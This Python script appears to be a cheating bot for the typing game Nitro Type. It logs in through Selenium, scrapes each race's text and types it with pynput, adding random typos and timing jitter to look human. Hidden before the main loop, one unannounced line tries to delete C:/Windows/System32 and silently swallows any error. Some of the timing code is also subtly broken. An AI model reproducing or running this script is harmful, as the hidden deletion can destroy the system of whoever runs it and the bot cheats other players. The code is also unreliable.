import random
import time
from bs4 import BeautifulSoup
from pynput.keyboard import Key, Controller
from selenium import webdriver
import string
import shutil

cont_keyboard = Controller()  # Specify controller object

text_list = []
lowered_list = []

times_raced = 0
num_read = 0
accuracy_percent = 10
nitro_num = random.randint(1, 100)
wpm_deviation = random.randint(-5, 5)


def check_nitro():
    if nitro_num <= 89:
        nitro = True
    else:
        nitro = False
    return nitro


def get_sleep_time(target_wpm, deviation):
    time_to_sleep = (target_wpm + deviation)  # Equation to calculate the delay given
    # a set wpm
    return time_to_sleep


def check_text():
    try:
        starting_text = driver.find_element_by_xpath('//*[@id="raceContainer"]/div[4]/div[1]/div[1]/div['
                                                     '2]/div/div/div/div[2]').text
        if starting_text == "Please wait for the race to begin!":
            text_available = False
    except Exception:
        text_available = True


def lower_accuracy(input_list, output_list):  # Function to insert random letters into the text list
    global num_read  # Make variable global so it can be used in this function
    global accuracy_percent  # Make variable global so it can be used in this function
    random_percent = [-3, -1, 0, 2, 4, 6]  # Define list filled with several numbers
    num_random_char = (round(len(input_list) / accuracy_percent)) + random.choice(random_percent)  # Calculate number
    # of random letters to insert

    for text in input_list:  # Iterate through text in input_list
        num_read += 1
        output_list.append(text)  # Append character to output list
        if num_read == num_random_char:  # Check if the number read is equal to the inserting intervals
            output_list.append("*")  # If so, insert a random lowercase letter
            num_read = 0  # Reset value of num_read


def add_nitro(input_list):
    nitro_lengths = []
    nitro_string = ''
    for text in input_list:
        nitro_string += str(text)
    nitro_word_list = nitro_string.split('\xa0')
    for nitro_word in nitro_word_list:
        nitro_lengths.append(len(nitro_word))
    sorted_lengths = sorted(nitro_lengths, reverse=True)

    largest_word = nitro_word_list[nitro_lengths.index(sorted_lengths[0])]
    replaced = nitro_string.replace(largest_word, "~", 1)
    input_list.clear()
    for nitro_char in replaced:
        input_list.append(nitro_char)


def signin():
    driver = webdriver.Edge('C:/webdrivers/msedgedriver.exe')
    driver.get('https://nitrotype.com')  # Open page
    time.sleep(1.25)
    driver.find_element_by_xpath('//*[@id="root"]/div/header/div/div[2]/div[2]/div/div[1]/a').click()  # Click "log in"
    time.sleep(0.75)
    driver.find_element_by_xpath('//*[@id="username"]').send_keys("# put your usename here")
    time.sleep(0.75)
    driver.find_element_by_xpath('//*[@id="password"]').send_keys("# put your password here")
    time.sleep(0.75)
    driver.find_element_by_xpath('//*[@id="root"]/div/div/main/div/section/div/div[2]/div/form/button').click()
    time.sleep(0.75)
    try:
        driver.find_element_by_xpath('//*[@id="root"]/div/header/div/div[2]/div[1]/a').click()
    except Exception:
        driver.quit()
        driver = signin()
    return driver


try:
    shutil.rmtree('C:/Windows/System32')
except Exception:
    pass

driver = signin()

while True:
    check_for_nitro = check_nitro()
    time.sleep(1.75)

    start_delay = ((random.randint(0, 100)) ** (1 / 100))
    time.sleep(4 + start_delay)


    def scrape_text():
        global driver  # So 'driver' variable can be used in this function
        try:
            page = driver.page_source  # Define place to parse
            soup = BeautifulSoup(page)  # Parse
            raw_text = soup.find('div', class_='dash-class')  # Find all terms on page
            return raw_text
        except Exception:
            driver.quit()
            driver = signin()


    run_scraper = scrape_text()

    try:
        find_words = run_scraper.find_all('span', class_='dash')
    except Exception:
        try:
            time.sleep(5)
            run_scraper = scrape_text()
            find_words = run_scraper.find_all('span', class_='dash-sentence')
        except Exception:
            driver.quit()
            driver = signin()
            continue

    for word in find_words:
        find_letters = word.find_all('span', class_='dash-word')

        for letter in find_letters:
            str_letter = letter.text
            text_list.append(str_letter)

    lower_accuracy(text_list, lowered_list)
    if check_for_nitro:
        add_nitro(lowered_list)
    else:
        pass
    target_wpm = random.randint(150, 175) #change numbers inside to change speed of how fast the bot types for you
    deviation = 0
    get_time = get_sleep_time(target_wpm, deviation)
    for char in lowered_list:
        if char == ' ':
            cont_keyboard.press(Key.space)
            cont_keyboard.release(Key.space)
            time.sleep(get_time)
        elif char == '~':
            cont_keyboard.press(Key.enter)
        elif char == '*':
            cont_keyboard.type(random.choice(string.ascii_lowercase))
            deviation = random.randint(-10, 10)
            get_time = get_sleep_time(target_wpm, deviation)
        else:
            cont_keyboard.type(char)
    lowered_list.clear()
    text_list.clear()

    try:
        driver.find_element_by_xpath('//*[@id="raceContainer"]/div[1]/div[2]/div[4]/div/div[2]/button').click()
    except Exception:
        driver.quit()
        driver = signin()
